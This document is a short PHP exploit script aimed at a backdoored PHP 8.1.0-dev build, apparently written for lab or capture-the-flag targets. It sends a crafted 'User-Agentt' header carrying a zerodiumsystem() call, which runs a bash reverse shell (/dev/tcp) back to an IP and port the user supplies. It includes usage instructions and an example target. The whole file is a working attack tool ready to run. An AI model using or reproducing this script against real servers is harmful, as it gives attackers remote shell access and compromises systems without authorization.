#!/usr/bin/env php

<?php

/*
This backdoor is very simple
Just send User-Agentt: zerodiumsystem("command");
Link: https://github.com/vida00/Backdoor-PHP8.1.0
*/

class Exploit{
	private $ch;

	public function __construct($target_url){
		$this->ch = curl_init();
		curl_setopt_array($this->ch,[
			CURLOPT_URL => $target_url,
			CURLOPT_CUSTOMREQUEST => "GET"
		]);
	}

	public function send_payload($ip, $port){

		# zerodiumsystem("/bin/bash -c 'bash -i >&/dev/tcp/ip/porta 0>&1'")
		$payload = "zerodiumsystem(".'"/bin/bash -c '."'bash -i >&/dev/tcp/{$ip}/{$port} 0>&1'".'");';

		$payload_final = [
			"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
			"User-Agentt: {$payload}"
		];

		echo $payload_final[1]."\n\n";

		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $payload_final);
		curl_exec($this->ch);
		curl_close($this->ch);
	}

}

if(!isset($argv[1]) && !isset($argv[2]) && !isset($argv[3])){
	echo "Execute with: php {$argv[0]} http://target.com/ yourIP yourPORT\n";
	echo "Example: php {$argv[0]} http://10.10.10.242/ 10.10.15.56 4440\n\n";
	exit(1);
}

$xpl = new Exploit($argv[1]);
$xpl->send_payload($argv[2], $argv[3]);

?>
